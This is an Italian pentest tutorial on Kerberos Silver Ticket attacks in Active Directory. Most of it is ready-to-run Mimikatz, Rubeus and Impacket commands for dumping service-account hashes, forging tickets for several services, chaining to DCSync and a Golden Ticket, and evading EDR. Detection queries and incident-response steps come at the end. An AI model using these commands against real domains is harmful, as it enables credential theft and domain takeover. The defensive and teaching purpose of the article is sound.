---
title: 'Silver Ticket Attack: Cos''è, Come Funziona e Come Difendersi in AD'
slug: silver-ticket
description: 'Il Silver Ticket forgia un TGS Kerberos usando l''hash di un account di servizio, bypassando il KDC completamente. Guida completa: come ottenerlo, forgiarlo con Mimikatz, Rubeus e Impacket, scenari per CIFS, LDAP, MSSQL, HTTP, e come rilevarlo.'
image: /silver-ticket-active-directory-AD-attack-hackita.webp
draft: true
date: 2026-07-08T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - active-directory
  - ticket-windows
  - silver-ticket
---

# Silver Ticket Attack: Accesso Stealth ai Servizi in Active Directory

> **TL;DR:** Il Silver Ticket forgia un TGS Kerberos usando l'hash dell'account di servizio target — senza mai contattare il KDC. È più limitato del Golden Ticket (un servizio, un host) ma è anche più stealth: non genera eventi sul DC. Se hai l'hash del computer account del DC, puoi forgiare un Silver Ticket per LDAP ed eseguire un DCSync senza essere Domain Admin.

***

## Glossario rapido

Per il protocollo Kerberos completo vedi [Kerberos — autenticazione in Active Directory](https://hackita.it/articoli/kerberos/).

* **TGS (Ticket Granting Service)**: Ticket per accedere a un singolo servizio specifico (CIFS, LDAP, MSSQL…). Diverso dal TGT che è il "passaporto" generale.
* **SPN (Service Principal Name)**: Identificatore univoco di un servizio in AD. Formato `servizio/host.dominio`. Es: `cifs/DC01.corp.local`.
* **PAC (Privilege Attribute Certificate)**: Struttura dentro il TGS che lista i gruppi dell'utente. Il servizio la legge per decidere i permessi — ma raramente la valida contro il DC.
* **Service account**: Account che esegue un servizio Windows (SQL Server, IIS, ecc.). Può essere un normale account utente AD oppure il **computer account** della macchina (es. `DC01$`).

***

## Kerberos internals: perché il Silver Ticket funziona

**Flusso normale Kerberos:**

```
Client ──AS-REQ──► KDC ──AS-REP (TGT)──► Client
Client ──TGS-REQ (TGT)──► KDC ──TGS-REP (TGS cifrato con hash service)──► Client
Client ──TGS──► Servizio ──verifica hash, legge PAC──► Accesso concesso
```

**Flusso Silver Ticket (senza KDC):**

```
Attaccante ──[forgia TGS offline con hash service account]──► TGS falso
Attaccante ──TGS falso──► Servizio ──decripta con proprio hash, legge PAC falso──► Accesso concesso
                                           ▲
                              KDC non viene mai contattato
                              Nessun evento sul DC
```

Nel flusso normale il KDC è al centro di tutto. Nel Silver Ticket il KDC non esiste — l'attaccante impersona direttamente il risultato del processo che il KDC avrebbe prodotto.

1. Il client presenta il TGT al KDC e richiede un TGS per il servizio (`TGS-REQ`).
2. Il KDC genera il TGS, lo **cifra con l'hash dell'account di servizio**, e lo restituisce (`TGS-REP`).
3. Il client presenta il TGS al servizio.
4. Il servizio **decripta il TGS con la propria chiave** (il suo hash NTLM o AES) e legge il PAC.
5. Il servizio concede o nega l'accesso in base al PAC — **senza contattare il DC**.

**La falla:** il servizio si fida del TGS perché è cifrato con la sua chiave. Se l'attaccante ha quella chiave, può forgiare un TGS con qualsiasi PAC — mettendoci qualsiasi utente, con qualsiasi gruppo — e il servizio lo accetterà come legittimo.

**Cosa non succede:** nessun `TGS-REQ` al KDC, nessun evento 4769 sul Domain Controller. Il servizio ha accettato un ticket completamente falso senza saperlo e senza che nessuno lo abbia visto.

> **Aggiornamento Nov 2021 (patch MS KB5008380):** Prima di questa patch, il Silver Ticket poteva usare username inventati. Dopo la patch, se PAC validation è attiva, l'username deve esistere realmente in AD. Su sistemi non aggiornati o senza PAC validation il vecchio comportamento è ancora possibile.

***

## Introduzione

Il Silver Ticket è classificato **[T1558.002](https://attack.mitre.org/techniques/T1558/002/) (MITRE ATT\&CK)**. Non richiede l'hash di krbtgt, non richiede Domain Admin — basta l'hash di un singolo account di servizio. In cambio, l'accesso è limitato a quel servizio su quell'host specifico.

È la tecnica di scelta quando vuoi accesso **stealth e mirato** senza muovere l'intera catena di compromissione del dominio.

**Dove si posiziona rispetto alle altre tecniche:**

| Tecnica                                                         | Cosa usi                | Scope                     | Richiede DA? | Contatta DC? |
| --------------------------------------------------------------- | ----------------------- | ------------------------- | ------------ | ------------ |
| [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/)     | Hash NTLM utente        | Singolo host (NTLM)       | No           | No           |
| [Pass-the-Ticket](https://hackita.it/articoli/pass-the-ticket/) | TGT/TGS da LSASS        | Risorse del dominio       | No           | No           |
| **Silver Ticket**                                               | Hash service account    | **Singolo servizio/host** | **No**       | **No**       |
| [Golden Ticket](https://hackita.it/articoli/golden-ticket/)     | Hash krbtgt             | Intero dominio            | Sì           | No           |
| [Diamond Ticket](https://hackita.it/articoli/diamond-ticket/)   | Hash krbtgt + TGT reale | Intero dominio            | Sì           | Sì           |
| [Sapphire Ticket](https://hackita.it/articoli/sapphire-ticket/) | Hash krbtgt + PAC reale | Intero dominio            | Sì           | Sì           |

Il Silver Ticket è il più stealth di tutti perché non genera **nessun evento sul DC** — né AS-REQ né TGS-REQ. Il servizio target è l'unico punto di contatto.

***

## Come funziona (e quando serve davvero)

L'attaccante forgia un TGS direttamente, senza passare dal KDC. Il servizio target decripta il TGS con la sua chiave, legge il PAC manipolato, e concede l'accesso all'utente impersonato (tipicamente Administrator o un account admin).

**Quando serve davvero:**

* Hai l'hash di un **computer account** (`HOST$`) o di un **service account** e vuoi accedere al suo servizio in silenzio.
* Vuoi **evitare di toccare il KDC** (ambienti con MDI che monitora i TGS-REQ anomali).
* Hai l'hash di **DC01$** → forgi Silver Ticket per LDAP → esegui [DCSync](https://hackita.it/articoli/dcsync/) **senza essere DA** (scenario devastante, vedi sotto).
* Vuoi **accesso persistente a un singolo servizio** anche dopo il cambio password dell'utente impersonato.
* Stai lavorando **offline** o in ambienti dove il DC è irraggiungibile.

***

## La catena d'accesso fino all'hash del service account

### Come si ottiene l'hash di un service account

**1. Kerberoasting (scenario più comune)**

[Kerberoasting](https://hackita.it/articoli/kerberoasting/) richiede TGS per tutti gli account con SPN, li scarica e li cracka offline con hashcat. L'hash craccato è direttamente utilizzabile per il Silver Ticket.

```bash
# Enumera tutti gli SPN e richiedi i TGS
impacket-GetUserSPNs corp.local/user:Password123 -dc-ip 10.10.10.5 -request -outputfile kerberoast.txt

# Cracca offline
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# L'hash risultante (NTLM del service account) è il tuo Silver Ticket key
```

**2. Dump locale della macchina che esegue il servizio**

Se hai accesso locale (local admin) sul server che ospita il servizio, **[Mimikatz](https://hackita.it/articoli/mimikatz/)** può dumpare LSASS e restituire sia l'hash NTLM che le chiavi AES:

```powershell
# Mimikatz — dump LSASS in memoria
privilege::debug
sekurlsa::logonpasswords
# Cerca l'account del servizio nella lista

# Alternativa: dump del computer account (sempre presente su ogni macchina)
sekurlsa::logonpasswords
# Computer account = macchina stessa (es. WS01$) → chiave per HOST, CIFS, ecc.
```

**3. [DCSync](https://hackita.it/articoli/dcsync/) (se già DA)**

Se sei già Domain Admin e vuoi l'hash di un service account o computer account specifico, **[impacket-secretsdump](https://hackita.it/articoli/impacket/)** è il metodo più rapido da Linux:

```bash
# Impacket
impacket-secretsdump corp.local/Administrator:pass@DC_IP -just-dc-user 'WS01$'

# Mimikatz
lsadump::dcsync /domain:corp.local /user:WS01$
```

**4. NTDS.dit**

Estrae tutti gli hash del dominio in blocco — vedi [DCSync](https://hackita.it/articoli/dcsync/).

**Come estrarre le chiavi AES (non solo NTLM)**

In ambienti moderni l'AES è preferito all'RC4 — sia per stealth che perché alcuni domini forzano AES. Per ottenere le chiavi AES di un service account:

```powershell
# Mimikatz — dump chiavi AES da LSASS (preferibile a sekurlsa::logonpasswords per AES)
privilege::debug
sekurlsa::ekeys
# Output per ogni account:
# * AES256 HMAC: <chiave hex 64 chars>
# * AES128 HMAC: <chiave hex 32 chars>
# * RC4-HMAC: <NTLM hash>
```

```bash
# Impacket secretsdump — estrae NTLM e Kerberos keys insieme
impacket-secretsdump corp.local/Administrator:pass@TARGET -just-dc-user 'svc_sql'
# Output include sia NT hash che aes256-cts-hmac-sha1-96 e aes128-cts-hmac-sha1-96

# Se hai craccato la password via Kerberoasting, puoi ricavare AES dalla password:
python3 -c "
import hashlib, hmac, struct
# Oppure usa: impacket-secretsdump LOCAL + system hive per AES keys
"
# In pratica: usa sempre impacket-secretsdump o sekurlsa::ekeys per avere le chiavi AES direttamente
```

**Prima di forgiare, controlla se il target accetta AES:**

```bash
nxc ldap DC_IP -u user -p pass --query "(samAccountName=svc_sql)" "msDS-SupportedEncryptionTypes"
```

| Valore | Significato                             | Usa                 |
| ------ | --------------------------------------- | ------------------- |
| `0`    | Default legacy — tutti i tipi accettati | RC4 o AES           |
| `8`    | Solo AES128                             | `-aesKey` (128 bit) |
| `16`   | Solo AES256                             | `-aesKey` (256 bit) |
| `24`   | AES128 + AES256                         | `-aesKey`           |
| `28`   | RC4 + AES128 + AES256                   | RC4 o AES           |

## Se il valore è `0` o `28` puoi usare NTLM hash (RC4). Se è `16` o `24`, sei obbligato a usare la chiave AES — un ticket RC4 viene rifiutato direttamente dal servizio.

## Prerequisiti

* Hash NTLM **o** chiave AES128/256 dell'account di servizio target
* Domain SID del dominio
* FQDN del dominio
* SPN del servizio target (es. `cifs/DC01.corp.local`)
* Username esistente in AD da impersonare (post-patch Nov 2021)

```bash
# Recupera Domain SID se non lo hai
impacket-lookupsid corp.local/user:Password123@DC_IP 0

# Enumera SPN disponibili
impacket-GetUserSPNs corp.local/user:Password123 -dc-ip DC_IP
```

***

## Step 1 — Identificare il target e ottenere l'hash

Prima di tutto devi sapere qual è il SPN del servizio che vuoi colpire e chi è l'account che lo ospita. Puoi usare [Impacket](https://hackita.it/articoli/impacket/), [NetExec](https://hackita.it/articoli/netexec/), PowerView o [BloodHound](https://hackita.it/articoli/bloodhound/):

```bash
# Enumera tutti i SPN del dominio (con Impacket)
impacket-GetUserSPNs corp.local/user:Password123 -dc-ip DC_IP

# Con nxc
nxc ldap DC_IP -u user -p Password123 --kerberoast kerberoast.txt

# Con PowerView — utile se sei già su un host Windows
Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
# Filtra solo kerberoastabili con path verso risorse critiche
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,memberof

# Con BloodHound — dopo aver importato i dati del dominio
# Analysis → "List all Kerberoastable Accounts"
# Vantaggio: mostra subito se il service account ha path verso DA o verso host critici
# Evita di perdere tempo su account isolati senza impatto reale

# Trova il computer account di un host specifico (ha sempre SPN)
nxc smb TARGET_IP -u user -p Password123 --computer-accounts
```

***

## Step 2 — Forgiare il Silver Ticket

### Con [Mimikatz](https://hackita.it/articoli/mimikatz/)

[Mimikatz](https://hackita.it/articoli/mimikatz/) usa il comando `kerberos::golden` anche per i Silver Ticket — la differenza è l'aggiunta di `/target:` e `/service:` e l'uso dell'hash del service account invece di krbtgt.

```powershell
# Silver Ticket per CIFS (accesso file share, C$)
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-XXXXXXXXXX \
  /target:SERVER.corp.local \
  /service:cifs \
  /rc4:NTLM_HASH_SERVICE_ACCOUNT \
  /ticket:silver_cifs.kirbi

# Con AES256 (più stealth)
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-XXXXXXXXXX \
  /target:SERVER.corp.local \
  /service:cifs \
  /aes256:AES256_KEY_SERVICE_ACCOUNT \
  /ticket:silver_cifs.kirbi

# OPSEC — durata realistica (evita il default di 10 anni)
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-XXXXXXXXXX \
  /target:SERVER.corp.local \
  /service:cifs \
  /aes256:AES256_KEY \
  /startoffset:0 /endin:600 /renewmax:10080 \
  /ticket:silver_cifs.kirbi

# Inject diretto in sessione corrente
kerberos::ptt silver_cifs.kirbi
```

### Con Rubeus

**[Rubeus](https://hackita.it/articoli/rubeus/)** — per il Silver Ticket usa il subcommand `silver` (diverso dal `golden`):

```powershell
# Forge e inject in memoria
Rubeus.exe silver /service:cifs/SERVER.corp.local \
  /aes256:AES256_KEY \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-XXXXXXXXXX \
  /nowrap /ptt

# Con NTLM hash (RC4)
Rubeus.exe silver /service:cifs/SERVER.corp.local \
  /rc4:NTLM_HASH \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-XXXXXXXXXX \
  /nowrap /ptt

# Crea processo separato con il ticket (più pulito, evita contaminazione sessione)
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
# Prendi il LUID dall'output, poi inietta il ticket in quel LUID:
Rubeus.exe silver /service:cifs/SERVER.corp.local /aes256:KEY /user:Admin \
  /domain:corp.local /sid:SID /luid:0x123456 /ptt
```

### Con Impacket da Linux

**ticketer.py** — script [Impacket](https://hackita.it/articoli/impacket/) per forging Silver Ticket da Linux con `-spn`:

```bash
# Con NTLM hash (RC4)
python3 ticketer.py \
  -nthash NTLM_HASH \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain corp.local \
  -spn cifs/SERVER.corp.local \
  Administrator

# Con AES256 (preferibile)
python3 ticketer.py \
  -aesKey AES256_KEY \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain corp.local \
  -spn cifs/SERVER.corp.local \
  Administrator

# Con durata realistica (in minuti)
python3 ticketer.py \
  -aesKey AES256_KEY \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain corp.local \
  -spn cifs/SERVER.corp.local \
  -duration 600 \
  Administrator

# Usa il ticket
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass corp.local/Administrator@SERVER.corp.local
```

### Conversione .kirbi ↔ .ccache

```bash
impacket-ticketConverter silver_cifs.kirbi silver_cifs.ccache
impacket-ticketConverter silver_cifs.ccache silver_cifs.kirbi
```

### Altri strumenti

**kekeo** — toolkit di Benjamin Delpy (stesso autore di Mimikatz) specializzato esclusivamente per operazioni Kerberos. È più leggero di Mimikatz perché non tocca LSASS — utile quando vuoi fare operazioni sui ticket senza avvicinarti alla memoria del processo di autenticazione.

```powershell
# Silver Ticket con kekeo (sintassi alternativa)
kekeo.exe "tgs::forge /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /user:Administrator /service:cifs/SERVER.corp.local /rc4:NTLM_HASH /ptt"
```

> In ambienti con EDR che blocca [Mimikatz](https://hackita.it/articoli/mimikatz/) attivamente, kekeo può passare inosservato più facilmente per la sua firma binaria differente e la superficie d'attacco ridotta. Il vantaggio OPSEC principale è che **non interagisce con LSASS** per creare il ticket — usa direttamente le API Kerberos di Windows. Questo evita i pattern di accesso a LSASS che molti EDR tracciano come indicatori di compromissione (OpenProcess su lsass.exe). Non è una soluzione universale ma vale tenerlo in toolkit.

***

## Scenari per servizio: cosa puoi fare con ogni Silver Ticket

Questa è la sezione chiave del Silver Ticket. Il servizio che colpisci determina cosa riesci a fare. L'SPN che metti nel ticket deve corrispondere al servizio target.

### CIFS / SMB — accesso file system

L'SPN `cifs/HOST` ti dà accesso completo al file system dell'host (C$, D$, share amministrativi) come se fossi Administrator.

```powershell
# Forge
kerberos::golden /user:Administrator /domain:corp.local /sid:SID \
  /target:DC01.corp.local /service:cifs /rc4:HASH_DC01$ /ptt

# Usa
dir \\DC01\C$
dir \\DC01\ADMIN$
copy \\DC01\C$\Windows\NTDS\ntds.dit C:\temp\
```

```bash
# Da Linux
python3 ticketer.py -nthash HASH -domain-sid SID -domain corp.local \
  -spn cifs/DC01.corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass corp.local/Administrator@DC01.corp.local
```

### HOST — esecuzione remota e servizi Windows

L'SPN `host/HOST` include una serie di servizi built-in Windows: SCM (Service Control Manager), Task Scheduler, Remote Registry. Ti permette di creare scheduled task, gestire servizi, leggere il registro.

```powershell
kerberos::golden /user:Administrator /domain:corp.local /sid:SID \
  /target:DC01.corp.local /service:host /rc4:HASH_DC01$ /ptt

# Scheduled task remoto
schtasks /create /s DC01.corp.local /tn "Backdoor" /tr "cmd /c whoami > C:\out.txt" /sc once /st 00:00
schtasks /run /s DC01.corp.local /tn "Backdoor"
```

### LDAP — DCSync senza essere Domain Admin ⚠️

**Scenario critico.** L'SPN `ldap/DC01` ti permette di eseguire operazioni LDAP sul DC — inclusa la replica DCSync. Se ottieni l'hash del computer account del DC (`DC01$`), puoi forgiare un Silver Ticket per LDAP ed eseguire un DCSync completo **senza avere mai avuto Domain Admin**.

```bash
# Step 1 — Ottieni hash di DC01$ (Kerberoasting non funziona qui — è un computer account)
# Devi avere accesso locale sul DC o eseguire secretsdump da un account con privilegi
impacket-secretsdump corp.local/svc_backup:Password1@DC_IP -just-dc-user 'DC01$'

# Step 2 — Forgia Silver Ticket per LDAP
python3 ticketer.py -nthash HASH_DC01 -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain corp.local -spn ldap/DC01.corp.local Administrator

# Step 3 — DCSync con il ticket
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/Administrator@DC01.corp.local
# → estrae tutti gli hash del dominio incluso krbtgt
```

> Questo è uno dei path di escalation più sottovalutati: comprometti un account con accesso limitato al DC (backup, monitoring), ottieni l'hash di `DC01$`, Silver Ticket LDAP, [DCSync](https://hackita.it/articoli/dcsync/) → [Golden Ticket](https://hackita.it/articoli/golden-ticket/). Tutto senza mai essere formalmente Domain Admin.

### MSSQL — accesso database

L'SPN `MSSQLSvc/host:porta` ti dà accesso al SQL Server come l'account di servizio. Se quell'account è sysadmin, hai `xp_cmdshell` → RCE. Approfondimento completo in [Porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/).

```bash
python3 ticketer.py -nthash HASH_MSSQL_SVC -domain-sid SID \
  -domain corp.local -spn MSSQLSvc/SQL01.corp.local:1433 Administrator

export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass corp.local/Administrator@SQL01.corp.local
```

```powershell
# Da Windows
kerberos::golden /user:Administrator /domain:corp.local /sid:SID \
  /target:SQL01.corp.local /service:MSSQLSvc /rc4:HASH /ptt

# Poi connettiti con Management Studio o sqlcmd usando autenticazione Windows
```

### HTTP / HTTPS — web app e Exchange

L'SPN `http/HOST` ti dà accesso a IIS, Outlook Web App, Exchange EWS, e qualsiasi web app con autenticazione Windows.

```powershell
kerberos::golden /user:Administrator /domain:corp.local /sid:SID \
  /target:EXCHANGE.corp.local /service:http /rc4:HASH /ptt
# Poi naviga a https://EXCHANGE/owa con il browser (userà il ticket Kerberos della sessione)
```

### RPCSS — WMI e DCOM

L'SPN `rpcss/HOST` ti permette di usare WMI per esecuzione remota di comandi. Da Linux usa **[impacket-wmiexec](https://hackita.it/articoli/impacket/)**:

```powershell
kerberos::golden /user:Administrator /domain:corp.local /sid:SID \
  /target:SERVER.corp.local /service:rpcss /rc4:HASH /ptt

# Esecuzione via WMI
wmic /node:SERVER.corp.local process call create "cmd /c whoami > C:\out.txt"
```

```bash
# Da Linux
python3 ticketer.py -nthash HASH -domain-sid SID -domain corp.local \
  -spn rpcss/SERVER.corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass corp.local/Administrator@SERVER.corp.local
```

### WSMAN / PowerShell Remoting

```powershell
kerberos::golden /user:Administrator /domain:corp.local /sid:SID \
  /target:SERVER.corp.local /service:wsman /rc4:HASH /ptt

Enter-PSSession -ComputerName SERVER.corp.local -Authentication Kerberos
```

### TERMSRV — RDP interattivo stealth

L'SPN `termsrv/HOST` ti permette di aprire una sessione RDP sull'host come l'utente impersonato, senza conoscerne la password. Utile per accesso interattivo quando hai bisogno di una GUI o quando altri metodi di exec remoto sono bloccati dall'EDR.

```powershell
# Forge Silver Ticket per RDP
kerberos::golden /user:Administrator /domain:corp.local /sid:SID \
  /target:SERVER.corp.local /service:termsrv \
  /aes256:AES256_KEY \
  /startoffset:0 /endin:600 /renewmax:10080 \
  /ticket:silver_rdp.kirbi

# Inject in sessione corrente
kerberos::ptt silver_rdp.kirbi

# Apri RDP usando mstsc — userà il ticket Kerberos della sessione
mstsc /v:SERVER.corp.local
```

```bash
# Da Linux — usa xfreerdp con il ccache
python3 ticketer.py -aesKey AES256_KEY -domain-sid SID \
  -domain corp.local -spn termsrv/SERVER.corp.local Administrator

export KRB5CCNAME=Administrator.ccache
xfreerdp /v:SERVER.corp.local /u:Administrator /d:corp.local /sec:kerberos /cert-ignore
```

**Requisiti per RDP via Silver Ticket:**

* RDP abilitato sulla macchina target (porta 3389 raggiungibile)
* L'account impersonato deve avere il diritto locale **"Accedi tramite Servizi Desktop Remoto"** (`Allow log on through Remote Desktop Services`) sull'host target. Senza questo diritto la connessione viene rifiutata con "Access Denied" **anche con un ticket valido** — errore comune che fa pensare che il ticket sia sbagliato quando invece è un problema di permessi locali.

```powershell
# Verifica se l'account ha il diritto RDP sull'host (da eseguire sul target)
Get-LocalGroupMember -Group "Remote Desktop Users"
# Administrator è normalmente nel gruppo Administrators → ha il diritto implicitamente
# Account non-admin → deve essere in "Remote Desktop Users"

# Aggiungi un account al gruppo Remote Desktop Users sul target (se hai exec remoto)
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "corp\utente"
```

### Tabella riepilogativa SPN → capacità

| SPN                  | Cosa ottieni                            |
| -------------------- | --------------------------------------- |
| `cifs/HOST`          | Accesso C$, share, file system completo |
| `host/HOST`          | Task scheduler, SCM, Remote Registry    |
| `ldap/DC`            | LDAP queries, **DCSync**                |
| `MSSQLSvc/HOST:1433` | SQL Server → se sysadmin: `xp_cmdshell` |
| `http/HOST`          | IIS, OWA, Exchange EWS                  |
| `rpcss/HOST`         | WMI, DCOM, esecuzione remota            |
| `wsman/HOST`         | WinRM, PowerShell Remoting              |
| `termsrv/HOST`       | RDP interattivo                         |
| `gc/DC`              | Global Catalog queries                  |

***

## Step 3 — Verifica e uso del ticket

```powershell
# Windows — verifica ticket in cache
klist
# Dovresti vedere: SERVER: cifs/DC01.corp.local @ CORP.LOCAL

# Accesso diretto
dir \\DC01\C$
```

```bash
# Linux
klist
# Verifica presenza del ticket CIFS/HOST/ecc.

# Test accesso SMB
impacket-smbclient -k -no-pass corp.local/Administrator@SERVER.corp.local
```

***

## OPSEC offensiva

**AES256 invece di NTLM/RC4**
Se il service account ha `msDS-SupportedEncryptionTypes` configurato per solo AES, un ticket RC4 viene rifiutato. Usa sempre AES se disponibile. Nei domini moderni, RC4 per un computer account è anomalo e può triggerare alert.

**Durata realistica del ticket**
Il default dei tool è spesso 10 anni — firma riconoscibile. Usa `/startoffset:0 /endin:600` in [Mimikatz](https://hackita.it/articoli/mimikatz/) o `-duration 600` in ticketer.py per allinearti al default AD (10 ore).

**Username esistente in AD**
Post-patch Nov 2021, se PAC validation è attiva il username nel ticket deve esistere in AD. Usa sempre un account reale — preferibilmente con storia di attività legittima su quell'host.

**gMSA e computer account: timing critico**
I computer account ruotano la password ogni 30 giorni. Se l'hash è vecchio di più di 30 giorni potrebbe non funzionare. Verifica l'ultima rotazione prima di investire tempo nel forge.

**Inject in processo separato**
Con [Rubeus](https://hackita.it/articoli/rubeus/) usa `createnetonly` per creare un processo isolato con il ticket, evitando di contaminare la sessione corrente o sovrascrivere ticket legittimi.

**Uno SPN alla volta**
Un Silver Ticket vale per un solo SPN. Se hai bisogno di accedere a CIFS e WMI sullo stesso host, forgi due ticket separati.

***

## Limiti ed errori comuni

* **SPN sbagliato**: Il ticket deve avere l'SPN **esatto** del servizio (incluso FQDN, non IP). `cifs/10.10.10.5` non funziona — devi usare `cifs/DC01.corp.local`.
* **AES vs RC4**: Se il dominio forza AES e usi NTLM hash, il ticket viene rifiutato. Controlla `msDS-SupportedEncryptionTypes` dell'account target.
* **PAC validation attiva**: Se il servizio è configurato per validare il PAC contro il DC, il Silver Ticket viene rilevato e rifiutato. Raro per default, ma presente su alcuni ambienti hardened.
* **Computer account già ruotato**: I computer account cambiano password automaticamente ogni 30 giorni. Se l'hash è vecchio, il ticket non funzionerà.
* **Username inesistente (post-patch)**: Dopo Nov 2021 con PAC validation attiva, username inventati vengono rifiutati. Usa account reali di AD.
* **Clock Skew**: Come per tutti i ticket Kerberos — tolleranza di 5 minuti. Orologi sfasati = ticket rifiutato.
* **Scope limitato a un host**: Il Silver Ticket vale solo per il servizio sull'host specifico nel SPN. Non ti sposta su altri host.

***

## Scenario reale

Un pentester in un engagement AD ottiene accesso low-privilege a un server di backup che ha permessi di lettura su alcuni share del DC. Tramite accesso locale, fa dump di LSASS e recupera l'hash del computer account `DC01$`. Non è Domain Admin e il Kerberoasting non ha prodotto hash craccabili.

Con l'hash di `DC01$`:

1. Forgia un Silver Ticket per `ldap/DC01.corp.local`.
2. Esegue DCSync con impacket-secretsdump → estrae tutti gli hash del dominio incluso krbtgt.
3. Forgia un Golden Ticket con l'hash di krbtgt → persistenza totale.

Il tutto senza mai essere stato Domain Admin formalmente. L'unica traccia: un logon Kerberos di tipo 3 sul DC con l'account Administrator — ma non c'è nessun TGS-REQ sul DC nei log, perché il ticket era forgiato.

***

## Detection

Rilevare un Silver Ticket è **più difficile** di un Golden Ticket perché non genera eventi sul DC. I segnali sono sul target, non sul KDC.

**🔴 HIGH — Segnali critici (sul server target, non sul DC):**

* **Event ID 4624 (Logon Type 3)** sul server target con account insolito o da IP anomalo — senza corrispondente **Event ID 4769** sul DC.
* **Event ID 4627** — "Group Membership Information" — generato sul **server target** (non sul DC) dopo un logon riuscito. Contiene i SID dei gruppi dell'utente loggato. Se il PAC è falso, questi SID rifletteranno i gruppi inventati dall'attaccante. Utile per correlazione post-incident: se i gruppi in 4627 non corrispondono alla membership reale dell'utente in AD, il ticket era forgiato.
* Logon di account di servizio in orari insoliti o da IP diversi dal normale.

**🟡 MEDIUM — Segnali secondari:**

* Encryption type `0x17` (RC4) per un servizio configurato per AES.
* Ticket con lifetime anomalo (anni invece di ore).
* Accesso a share amministrativi (C$, ADMIN$) da account che normalmente non li usano.
* DCSync da un account che non è DA e non ha esplicitamente i permessi di replica — indica possibile Silver Ticket LDAP.

**Honey SPN:** Crea un account di servizio con un SPN "interessante" (es. `MSSQLSvc/db-prod`) ma zero accesso reale. Qualsiasi utilizzo di quel SPN è un alert garantito.

**PAC validation:** Se abilitata, il servizio contatta il DC per validare il PAC — genera Event ID **4769** sul DC anche per Silver Ticket, rompendo la stealth. È il modo più efficace per rendere rilevabili i Silver Ticket.

```powershell
# Verifica se PAC validation è attiva sul server target (da eseguire sul target con accesso)
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v ValidateKdcPacSignature
# 0x0 = disabilitata (default) → Silver Ticket passa inosservato
# 0x1 = abilitata → il servizio contatta il DC per validare il PAC

# Verifica remota con accesso locale admin
Invoke-Command -ComputerName SERVER.corp.local -ScriptBlock {
  (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa").ValidateKdcPacSignature
}
# Se il valore non esiste = disabilitata per default
```

**[Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/alerts-overview):** Ha detection per Silver Ticket basata su anomalie nei logon di rete — account che accedono a servizi senza TGS-REQ corrispondente sul DC.

**Correlazione SIEM — come implementare la rule**

La correlazione 4624 senza 4769 è la signature principale del Silver Ticket. Richiede log centralizzati da tutti i DC e da tutti i server critici. Esempio di logica in KQL (Microsoft Sentinel):

```kql
// Silver Ticket detection — 4624 su host target senza 4769 corrispondente sul DC
let timeWindow = 10m;
SecurityEvent
| where EventID == 4624 and LogonType == 3
| where TargetUserName !endswith "$"   // Escludi computer account legittimi
| extend logonTime = TimeGenerated, targetHost = Computer, targetUser = TargetUserName
| join kind=leftanti (
    SecurityEvent
    | where EventID == 4769   // TGS-REQ sul DC
    | extend tgsTime = TimeGenerated, tgsUser = TargetUserName
    | where tgsTime between (ago(timeWindow)..now())
) on $left.targetUser == $right.tgsUser
| where logonTime > ago(1h)
| project logonTime, targetHost, targetUser, IpAddress, LogonType
| sort by logonTime desc
```

Equivalente in Splunk SPL:

```spl
index=wineventlog EventCode=4624 Logon_Type=3
| eval logon_time=_time, target_user=Account_Name
| join type=left target_user [
    search index=wineventlog EventCode=4769
    | stats count by Account_Name
    | rename Account_Name as target_user
]
| where isnull(count)
| table logon_time, host, target_user, Source_Network_Address
```

> Queste rule generano falsi positivi in ambienti grandi — raffina con whitelist degli account di servizio legittimi e dei computer account. Usa come punto di partenza, non come regola definitiva.

***

## Incident Response

A differenza del Golden Ticket, il Silver Ticket **non richiede il reset di krbtgt** per essere invalidato.

1. **Identifica il service account compromesso**: Cerca nei log del server target l'Event ID 4624 con account anomali, poi risali all'account di servizio usato.
2. **Resetta la password del service account compromesso**:

```powershell
# Per un account utente normale
Set-ADAccountPassword -Identity svc_sql -Reset \
  -NewPassword (ConvertTo-SecureString "NuovaPwd!" -AsPlainText -Force)

# Per un computer account — forza reset immediato
Reset-ComputerMachinePassword -Server DC01.corp.local

# Oppure via netdom
netdom resetpwd /server:DC01.corp.local /ud:corp\Administrator /pd:*
```

1. **Se era un computer account**: Il reset forza la rinegoziazione della password con il DC. I ticket forgiati con la vecchia chiave diventano immediatamente non validi.
2. **Hunting sulle persistenze**: Verifica che l'attaccante non abbia già eseguito DCSync o forgiato un Golden Ticket prima che tu agisca. Se c'è stato accesso LDAP anomalo al DC, tratta come compromissione totale.
3. **Abilita PAC validation** dove applicabile per i servizi critici (vedi sezione mitigazione).
4. **Analizza tutti i logon di tipo 3** sui server critici nelle ultime settimane — cerca quelli senza TGS-REQ corrispondente sul DC.

***

## Ambienti ibridi: Silver Ticket e Azure AD

Il Silver Ticket è una tecnica **esclusivamente on-premise**. Non funziona per risorse cloud native (SharePoint Online, Exchange Online, Teams, Azure-joined devices) perché quelle usano token OAuth2/OIDC via Azure AD — non Kerberos on-prem.

